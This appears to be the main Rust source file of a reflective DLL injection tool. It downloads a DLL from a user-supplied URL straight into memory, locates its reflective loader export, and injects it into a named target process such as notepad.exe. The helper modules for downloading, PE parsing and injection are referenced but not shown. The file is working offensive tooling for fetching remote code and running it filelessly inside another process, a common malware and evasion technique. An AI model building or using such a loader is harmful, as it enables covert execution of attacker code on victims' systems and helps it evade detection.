mod download;
mod parse_pe;
mod inject;

use clap::Parser;

/// Inject ReflectiveDLL.dll into a target process.
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {

    /// Target process name (e.g., notepad.exe)
    #[arg(short, long)]
    process: String,

    // #[arg(short, long, conflicts_with = "url")]
    // file: Option<String>,

    // #[arg(short, long, conflicts_with = "file")]

    /// URL to download the DLL from (e.g., http://example.com/ReflectiveDLL.dll)
    #[arg(short, long)]
    url: Option<String>,
}


fn main() {
    let args = Args::parse();

    let Some(url) = args.url else {
        eprintln!("Error: --url must be provided.");
        std::process::exit(1);
    };


    println!("Downloading from {}", url);

    let data = download::download_to_memory(&url, None, None)
        .expect("Failed to download file");

    if data.len() > 0 {
        println!("Downloaded {} bytes", data.len());
    } else {
        println!("Downloaded empty file");
    }


    // let dll = pe_parser::new(data);
    let dll = parse_pe::PeParser::new(data);

    let func_raw = dll.get_func_raw("yolo").expect("Failed to find ReflectiveLoader function");
    println!("ReflectiveLoader raw offset: 0x{:X}", func_raw);

    inject::inject_dll_into_process(
        &args.process.encode_utf16().collect::<Vec<u16>>(),
        &dll,
        func_raw,
    ).expect("Failed to inject DLL!\n");


}
